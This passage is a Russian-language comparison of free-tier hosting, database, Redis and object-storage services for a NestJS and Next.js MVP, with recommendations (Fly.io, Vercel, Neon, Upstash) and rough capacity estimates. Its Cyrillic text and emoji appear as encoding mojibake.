- ‚úÖ **–ü–æ–ª–Ω–æ—Å—Ç—å—é –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π** (–Ω–µ —Ç—Ä–µ–±—É–µ—Ç –∫–∞—Ä—Ç—ã)
- ‚úÖ –ê–≤—Ç–æ–¥–µ–ø–ª–æ–π –∏–∑ GitHub/GitLab
- ‚úÖ –í—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π PostgreSQL + Redis
- ‚úÖ Custom domains + Auto SSL
- ‚úÖ Health checks
- ‚úÖ Simple Dockerfile deployment
- ‚úÖ Environment groups
- ‚úÖ Preview environments (–¥–ª—è PR)

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå **–°–ø–∏—Ç –ø–æ—Å–ª–µ 15 –º–∏–Ω—É—Ç –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏** (cold start 30-60 —Å–µ–∫)
- ‚ùå PostgreSQL —É–¥–∞–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ 90 –¥–Ω–µ–π (–Ω—É–∂–Ω–æ –±—ç–∫–∞–ø–∏—Ç—å)
- ‚ùå –ù–∏–∑–∫–∞—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å (0.1 CPU)

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** MVP, —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ, –¥–µ–º–æ

***

### **–í–∞—Ä–∏–∞–Ω—Ç C: Fly.io** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- –î–æ 3 shared-cpu VMs (256 MB RAM –∫–∞–∂–¥–∞—è)
- 160 GB bandwidth/–º–µ—Å—è—Ü
- PostgreSQL (3 GB storage, 1 instance)
- Redis —á–µ—Ä–µ–∑ Upstash (—Å–º. –Ω–∏–∂–µ)

**–ü–ª—é—Å—ã:**

- ‚úÖ **–ù–ï –°–ü–ò–¢** (always-on –≤ –æ—Ç–ª–∏—á–∏–µ –æ—Ç Render)
- ‚úÖ –ì–ª–æ–±–∞–ª—å–Ω–∞—è CDN (deploy –±–ª–∏–∑–∫–æ –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º)
- ‚úÖ 3 VM = –º–æ–∂–Ω–æ Backend + Worker + Cron –æ—Ç–¥–µ–ª—å–Ω–æ
- ‚úÖ Dockerfile deployment
- ‚úÖ Zero-downtime deploys
- ‚úÖ Logs \& metrics –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ
- ‚úÖ Auto SSL
- ‚úÖ –ù–µ —Ç—Ä–µ–±—É–µ—Ç –∫–∞—Ä—Ç—ã –¥–ª—è –Ω–∞—á–∞–ª–∞

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 256 MB RAM –º–∞–ª–æ–≤–∞—Ç–æ (–Ω—É–∂–Ω–æ –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ)
- ‚ùå PostgreSQL —Ç–æ–ª—å–∫–æ 3 GB storage
- ‚ùå –°–ª–æ–∂–Ω–µ–µ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å —á–µ–º Render

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** Production MVP —Å —Ä–µ–∞–ª—å–Ω—ã–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏

***

### **–í–∞—Ä–∏–∞–Ω—Ç D: Google Cloud Run** ‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 2 –º–∏–ª–ª–∏–æ–Ω–∞ –∑–∞–ø—Ä–æ—Å–æ–≤/–º–µ—Å—è—Ü
- 360,000 GB-seconds RAM
- 180,000 vCPU-seconds
- Always Free (–Ω–µ –∏—Å—Ç–µ–∫–∞–µ—Ç)

**–ü–ª—é—Å—ã:**

- ‚úÖ **–ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ** (Always Free tier)
- ‚úÖ –ê–≤—Ç–æ—Å–∫–µ–π–ª–∏–Ω–≥ (0 ‚Üí N –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤)
- ‚úÖ Pay-per-request (–ø–ª–∞—Ç–∏—à—å —Ç–æ–ª—å–∫–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ)
- ‚úÖ –û—á–µ–Ω—å –±—ã—Å—Ç—Ä—ã–π cold start (< 1 —Å–µ–∫)
- ‚úÖ Google infrastructure

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –¢—Ä–µ–±—É–µ—Ç GCP –∞–∫–∫–∞—É–Ω—Ç (–Ω—É–∂–Ω–∞ –∫–∞—Ä—Ç–∞ –¥–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏, –Ω–æ –Ω–µ —Å–ø–∏—à—É—Ç)
- ‚ùå –°–ª–æ–∂–Ω–µ–µ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å —á–µ–º Railway/Render
- ‚ùå PostgreSQL –∏ Redis –æ—Ç–¥–µ–ª—å–Ω–æ (–Ω—É–∂–Ω—ã –¥—Ä—É–≥–∏–µ —Å–µ—Ä–≤–∏—Å—ã)

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** Serverless –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞, low-traffic MVP

***

### **–í–∞—Ä–∏–∞–Ω—Ç E: Self-hosted –Ω–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ–º VPS**

**Oracle Cloud Always Free Tier:**

- 2 VM instances (1 GB RAM, 1/8 OCPU –∫–∞–∂–¥–∞—è)
- 200 GB storage
- 10 TB bandwidth/–º–µ—Å—è—Ü
- **–ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ**

**–ü–ª—é—Å—ã:**

- ‚úÖ –ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å
- ‚úÖ 2 VM = –º–æ–∂–Ω–æ Backend + Worker/DB –æ—Ç–¥–µ–ª—å–Ω–æ
- ‚úÖ 200 GB storage (–º–æ–∂–Ω–æ PostgreSQL + Redis + —Ñ–∞–π–ª—ã)
- ‚úÖ –ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ (–Ω–µ –∏—Å—Ç–µ–∫–∞–µ—Ç)

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –ù—É–∂–Ω–æ –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞—Ç—å –≤—Å—ë –≤—Ä—É—á–Ω—É—é (Docker, Nginx, SSL, backups)
- ‚ùå –¢—Ä–µ–±—É–µ—Ç DevOps –Ω–∞–≤—ã–∫–æ–≤
- ‚ùå –ù–µ—Ç –∞–≤—Ç–æ–¥–µ–ø–ª–æ—è (–Ω—É–∂–Ω–æ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å CI/CD)
- ‚ùå Maintenance –Ω–∞ —Ç–µ–±–µ

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ï—Å–ª–∏ –µ—Å—Ç—å –æ–ø—ã—Ç DevOps –∏ —Ö–æ—á–µ—à—å –∫–æ–Ω—Ç—Ä–æ–ª—å

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø BACKEND: Fly.io**

**–ü–æ—á–µ–º—É:**

1. ‚úÖ **–ù–ï –°–ü–ò–¢** (–∫—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è Telegram –±–æ—Ç–∞ –∏ POS webhooks)
2. ‚úÖ 3 VM = Backend + Worker + Cron jobs –æ—Ç–¥–µ–ª—å–Ω–æ
3. ‚úÖ PostgreSQL –≤—Å—Ç—Ä–æ–µ–Ω (3 GB —Ö–≤–∞—Ç–∏—Ç –Ω–∞ –ø–µ—Ä–≤—ã–µ 1000+ –≥–æ—Å—Ç–µ–π)
4. ‚úÖ –ü—Ä–æ—Å—Ç–æ–π –¥–µ–ø–ª–æ–π (`fly deploy`)
5. ‚úÖ Zero-downtime updates

**–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –Ω–∞ Fly.io:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Backend   ‚îÇ     ‚îÇ   Worker    ‚îÇ     ‚îÇ  Cron Jobs  ‚îÇ
‚îÇ  (256 MB)   ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ  (256 MB)   ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ  (256 MB)   ‚îÇ
‚îÇ  NestJS API ‚îÇ     ‚îÇ  BullMQ     ‚îÇ     ‚îÇ  Daily Jobs ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò     ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò     ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
       ‚îÇ                    ‚îÇ                    ‚îÇ
       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                           ‚îÇ
                  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                  ‚îÇ  PostgreSQL     ‚îÇ
                  ‚îÇ  (3 GB)         ‚îÇ
                  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```


***

## üåê **2. –•–û–°–¢–ò–ù–ì FRONTEND (Next.js Admin Panel)**

### **–í–∞—Ä–∏–∞–Ω—Ç A: Vercel** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier (Hobby):**

- Unlimited deployments
- 100 GB bandwidth/–º–µ—Å—è—Ü
- Serverless functions (100 GB-hours)
- Preview deployments –¥–ª—è –∫–∞–∂–¥–æ–≥–æ PR
- Auto SSL

**–ü–ª—é—Å—ã:**

- ‚úÖ **–°–æ–∑–¥–∞—Ç–µ–ª–∏ Next.js** (–∏–¥–µ–∞–ª—å–Ω–∞—è –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è)
- ‚úÖ –ê–≤—Ç–æ–¥–µ–ø–ª–æ–π –∏–∑ GitHub
- ‚úÖ Edge network (CDN)
- ‚úÖ Preview URLs –¥–ª—è –∫–∞–∂–¥–æ–≥–æ PR
- ‚úÖ Environment variables
- ‚úÖ Zero config (–ø—Ä–æ—Å—Ç–æ `git push`)
- ‚úÖ –ë–µ—Å–ø–ª–∞—Ç–Ω—ã–π –¥–æ–º–µ–Ω `*.vercel.app`

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 100 GB bandwidth –º–æ–∂–µ—Ç –Ω–µ —Ö–≤–∞—Ç–∏—Ç—å (–Ω–æ –¥–ª—è –∞–¥–º–∏–Ω–∫–∏ —Ö–≤–∞—Ç–∏—Ç)
- ‚ùå –ù–µ–ª—å–∑—è commercial use –Ω–∞ Hobby (–Ω–æ –¥–ª—è MVP —Ç–µ—Ä–ø–∏–º–æ)

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** Next.js frontend - –ª—É—á—à–∏–π –≤—ã–±–æ—Ä

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: Netlify** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 100 GB bandwidth/–º–µ—Å—è—Ü
- 300 build minutes/–º–µ—Å—è—Ü
- Preview deployments
- Auto SSL

**–ü–ª—é—Å—ã:**

- ‚úÖ –ü—Ä–æ—Å—Ç–æ–π –¥–µ–ø–ª–æ–π
- ‚úÖ –•–æ—Ä–æ—à–∏–π UI
- ‚úÖ Forms + Functions –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –ú–µ–¥–ª–µ–Ω–Ω–µ–µ —á–µ–º Vercel –¥–ª—è Next.js
- ‚ùå –ú–µ–Ω—å—à–µ —Ñ–∏—á –¥–ª—è Next.js

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ Vercel

***

### **–í–∞—Ä–∏–∞–Ω—Ç C: Cloudflare Pages** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- Unlimited bandwidth
- Unlimited requests
- 500 builds/–º–µ—Å—è—Ü

**–ü–ª—é—Å—ã:**

- ‚úÖ **Unlimited bandwidth** (–ª—É—á—à–∏–π free tier)
- ‚úÖ Cloudflare CDN (–æ—á–µ–Ω—å –±—ã—Å—Ç—Ä–æ)
- ‚úÖ Workers –¥–ª—è serverless functions

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –°–ª–æ–∂–Ω–µ–µ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å Next.js —á–µ–º –Ω–∞ Vercel
- ‚ùå –ù–µ –≤—Å–µ Next.js —Ñ–∏—á–∏ —Ä–∞–±–æ—Ç–∞—é—Ç

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ï—Å–ª–∏ –Ω—É–∂–µ–Ω unlimited bandwidth

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø FRONTEND: Vercel**

**–ü–æ—á–µ–º—É:**

- ‚úÖ Next.js —Å–æ–∑–¥–∞–Ω Vercel (–Ω–∞—Ç–∏–≤–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞)
- ‚úÖ Zero config
- ‚úÖ Preview deployments –¥–ª—è –∫–∞–∂–¥–æ–≥–æ PR (—É–¥–æ–±–Ω–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è)
- ‚úÖ 100 GB bandwidth —Ö–≤–∞—Ç–∏—Ç –¥–ª—è –∞–¥–º–∏–Ω–∫–∏

***

## üóÑÔ∏è **3. POSTGRESQL DATABASE**

### **–í–∞—Ä–∏–∞–Ω—Ç A: Supabase** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 500 MB database storage
- Unlimited API requests
- 50,000 monthly active users
- 2 GB bandwidth
- Auto backups (7 –¥–Ω–µ–π)
- PostgreSQL 15

**–ü–ª—é—Å—ã:**

- ‚úÖ **–ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ**
- ‚úÖ Realtime subscriptions (–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å)
- ‚úÖ Built-in Auth (–Ω–æ –º—ã —Å–≤–æ–π)
- ‚úÖ Auto API generation (REST + GraphQL)
- ‚úÖ Backups –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ
- ‚úÖ Connection pooling
- ‚úÖ Extensions (pgvector, PostGIS)

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 500 MB storage (–º–æ–∂–µ—Ç –Ω–µ —Ö–≤–∞—Ç–∏—Ç—å –ø—Ä–∏ —Ä–æ—Å—Ç–µ)
- ‚ùå –ü—Ä–æ–µ–∫—Ç –∑–∞—Å—ã–ø–∞–µ—Ç –ø–æ—Å–ª–µ 7 –¥–Ω–µ–π –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ (–Ω–æ –¥–ª—è DB —ç—Ç–æ –Ω–æ—Ä–º)

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** MVP –¥–æ 5000 –≥–æ—Å—Ç–µ–π

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: Neon.tech** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 3 GB storage (–±–æ–ª—å—à–µ —á–µ–º Supabase!)
- 0.5 GB RAM
- Unlimited databases
- Autoscaling (–≤–∫–ª—é—á–∞—è –¥–æ 0)
- Branching (–∫–∞–∫ git –¥–ª—è –ë–î)

**–ü–ª—é—Å—ã:**

- ‚úÖ **3 GB storage** (–≤ 6 —Ä–∞–∑ –±–æ–ª—å—à–µ Supabase)
- ‚úÖ Database branching (–º–æ–∂–Ω–æ —Å–æ–∑–¥–∞–≤–∞—Ç—å –∫–æ–ø–∏–∏ –¥–ª—è —Ç–µ—Å—Ç–æ–≤)
- ‚úÖ Autoscaling –¥–æ 0 (–Ω–µ –ø–ª–∞—Ç–∏—à—å –∫–æ–≥–¥–∞ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—à—å)
- ‚úÖ Connection pooling
- ‚úÖ Instant backups

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –ü—Ä–æ–µ–∫—Ç —É–¥–∞–ª—è–µ—Ç—Å—è –ø–æ—Å–ª–µ 7 –¥–Ω–µ–π –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –Ω–∞ free tier
- ‚ùå –ù—É–∂–Ω–æ –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏ "–ø–∏–Ω–≥–∞—Ç—å" —á—Ç–æ–±—ã –Ω–µ —É–¥–∞–ª–∏–ª–∏

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** MVP —Å database branching –¥–ª—è —Ç–µ—Å—Ç–æ–≤

***

### **–í–∞—Ä–∏–∞–Ω—Ç C: ElephantSQL** ‚≠ê‚≠ê‚≠ê

**Free Tier (Tiny Turtle):**

- 20 MB storage
- 5 concurrent connections

**–ü–ª—é—Å—ã:**

- ‚úÖ –ü—Ä–æ—Å—Ç–æ–π
- ‚úÖ –ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå **20 MB —Å–ª–∏—à–∫–æ–º –º–∞–ª–æ** (—Ö–≤–∞—Ç–∏—Ç –Ω–∞ 100 –≥–æ—Å—Ç–µ–π)
- ‚ùå 5 connections –º–∞–ª–æ

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –¢–æ–ª—å–∫–æ –¥–ª—è –ø—Ä–æ—Ç–æ—Ç–∏–ø–∞

***

### **–í–∞—Ä–∏–∞–Ω—Ç D: Fly.io PostgreSQL** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 3 GB storage
- 1 instance (256 MB RAM)
- Auto backups

**–ü–ª—é—Å—ã:**

- ‚úÖ 3 GB storage
- ‚úÖ –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Fly.io backend (–Ω–∏–∑–∫–∞—è latency)
- ‚úÖ –ù–∞—Å—Ç–æ—è—â–∏–π PostgreSQL (–Ω–µ managed)

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 256 MB RAM –º–∞–ª–æ–≤–∞—Ç–æ –¥–ª—è –±–æ–ª—å—à–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
- ‚ùå Backups –Ω—É–∂–Ω–æ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å —Å–∞–º–æ–º—É

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ï—Å–ª–∏ backend —Ç–æ–∂–µ –Ω–∞ Fly.io

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø POSTGRESQL: Neon.tech**

**–ü–æ—á–µ–º—É:**

- ‚úÖ **3 GB storage** (—Ö–≤–∞—Ç–∏—Ç –Ω–∞ 10,000+ –≥–æ—Å—Ç–µ–π —Å –∏—Å—Ç–æ—Ä–∏–µ–π)
- ‚úÖ **Database branching** (–º–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å –≤–µ—Ç–∫—É –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–æ–≤—ã—Ö —Ñ–∏—á)
- ‚úÖ Connection pooling (–≤–∞–∂–Ω–æ –¥–ª—è NestJS)
- ‚úÖ Autoscaling

**–†–∞—Å—á—ë—Ç storage:**

```
–ì–æ—Å—Ç—å: ~2 KB (–ø—Ä–æ—Ñ–∏–ª—å + –∫–∞—Ä—Ç–∞)
–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è: ~500 bytes
1000 –≥–æ—Å—Ç–µ–π √ó 2 KB = 2 MB
1000 –≥–æ—Å—Ç–µ–π √ó 10 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π √ó 500 bytes = 5 MB
–ò–¢–û–ì–û –Ω–∞ 1000 –≥–æ—Å—Ç–µ–π: ~20-30 MB —Å –∏–Ω–¥–µ–∫—Å–∞–º–∏

3 GB —Ö–≤–∞—Ç–∏—Ç –Ω–∞ ~10,000 –≥–æ—Å—Ç–µ–π —Å –ø–æ–ª–Ω–æ–π –∏—Å—Ç–æ—Ä–∏–µ–π
```


***

## üî¥ **4. REDIS (–ö—ç—à + –û—á–µ—Ä–µ–¥–∏ + Rate Limiting)**

### **–í–∞—Ä–∏–∞–Ω—Ç A: Upstash** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 10,000 commands/–¥–µ–Ω—å
- 256 MB storage
- Global read replicas
- TLS encryption

**–ü–ª—é—Å—ã:**

- ‚úÖ **Serverless Redis** (pay-per-request)
- ‚úÖ 10,000 commands —Ö–≤–∞—Ç–∏—Ç –¥–ª—è MVP
- ‚úÖ Global replicas (–Ω–∏–∑–∫–∞—è latency)
- ‚úÖ REST API (–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ–∑ Redis client)
- ‚úÖ –ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 10,000 commands/–¥–µ–Ω—å –º–æ–∂–µ—Ç –Ω–µ —Ö–≤–∞—Ç–∏—Ç—å –ø—Ä–∏ —Ä–æ—Å—Ç–µ
- ‚ùå 256 MB storage –º–∞–ª–æ–≤–∞—Ç–æ –¥–ª—è –±–æ–ª—å—à–∏—Ö –æ—á–µ—Ä–µ–¥–µ–π

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** MVP –¥–æ 1000 –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π/–¥–µ–Ω—å

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: Redis Cloud (Redis Labs)** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 30 MB storage
- 30 connections
- High availability

**–ü–ª—é—Å—ã:**

- ‚úÖ –û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π Redis
- ‚úÖ High availability
- ‚úÖ –ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå **30 MB –æ—á–µ–Ω—å –º–∞–ª–æ**
- ‚ùå 30 connections –º–æ–∂–µ—Ç –Ω–µ —Ö–≤–∞—Ç–∏—Ç—å

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –¢–æ–ª—å–∫–æ –¥–ª—è –∫—ç—à–∞ (–Ω–µ –¥–ª—è –æ—á–µ—Ä–µ–¥–µ–π)

***

### **–í–∞—Ä–∏–∞–Ω—Ç C: Render.com Redis** ‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 25 MB storage
- 90 –¥–Ω–µ–π –±–µ—Å–ø–ª–∞—Ç–Ω–æ (–ø–æ—Ç–æ–º —É–¥–∞–ª—è–µ—Ç—Å—è)

**–ü–ª—é—Å—ã:**

- ‚úÖ –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Render backend

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 25 MB –º–∞–ª–æ
- ‚ùå **–£–¥–∞–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ 90 –¥–Ω–µ–π**

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –¢–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø REDIS: Upstash**

**–ü–æ—á–µ–º—É:**

- ‚úÖ 10,000 commands/–¥–µ–Ω—å —Ö–≤–∞—Ç–∏—Ç –¥–ª—è MVP
- ‚úÖ Serverless (–ø–ª–∞—Ç–∏—à—å —Ç–æ–ª—å–∫–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ)
- ‚úÖ Global replicas (—Ä–∞–±–æ—Ç–∞–µ—Ç —Å Fly.io/Vercel)
- ‚úÖ –ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ

**–†–∞—Å—á—ë—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:**

```
Rate limiting: ~100 requests/–¥–µ–Ω—å
Session cache: ~50 reads/–¥–µ–Ω—å
Queue operations: ~200/–¥–µ–Ω—å
–ò–¢–û–ì–û: ~500 commands/–¥–µ–Ω—å (–≤ 20 —Ä–∞–∑ –º–µ–Ω—å—à–µ –ª–∏–º–∏—Ç–∞)
```


***

## üì¶ **5. S3 STORAGE (–§–∞–π–ª—ã, –õ–æ–≥–æ—Ç–∏–ø—ã, –ê–≤–∞—Ç–∞—Ä—ã)**

### **–í–∞—Ä–∏–∞–Ω—Ç A: Cloudflare R2** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 10 GB storage/–º–µ—Å—è—Ü
- 1 –º–∏–ª–ª–∏–æ–Ω Class A –æ–ø–µ—Ä–∞—Ü–∏–π (PUT, LIST)
- 10 –º–∏–ª–ª–∏–æ–Ω–æ–≤ Class B –æ–ø–µ—Ä–∞—Ü–∏–π (GET, HEAD)
- **Unlimited bandwidth** (egress free!)

**–ü–ª—é—Å—ã:**

- ‚úÖ **Unlimited bandwidth** (–≥–ª–∞–≤–Ω–æ–µ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–æ vs AWS S3)
- ‚úÖ 10 GB —Ö–≤–∞—Ç–∏—Ç –Ω–∞ —Ç—ã—Å—è—á–∏ –ª–æ–≥–æ—Ç–∏–ø–æ–≤
- ‚úÖ S3-compatible API (–ª–µ–≥–∫–æ –º–∏–≥—Ä–∏—Ä–æ–≤–∞—Ç—å)
- ‚úÖ –ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –¢—Ä–µ–±—É–µ—Ç –∞–∫–∫–∞—É–Ω—Ç Cloudflare

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** Production MVP

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: Backblaze B2** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 10 GB storage
- 1 GB download/–¥–µ–Ω—å
- Unlimited uploads

**–ü–ª—é—Å—ã:**

- ‚úÖ 10 GB storage
- ‚úÖ S3-compatible
- ‚úÖ –î–µ—à–µ–≤–ª–µ AWS

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 1 GB download/–¥–µ–Ω—å –º–æ–∂–µ—Ç –Ω–µ —Ö–≤–∞—Ç–∏—Ç—å

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ R2

***

### **–í–∞—Ä–∏–∞–Ω—Ç C: Supabase Storage** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 1 GB storage
- 2 GB bandwidth/–º–µ—Å—è—Ü

**–ü–ª—é—Å—ã:**

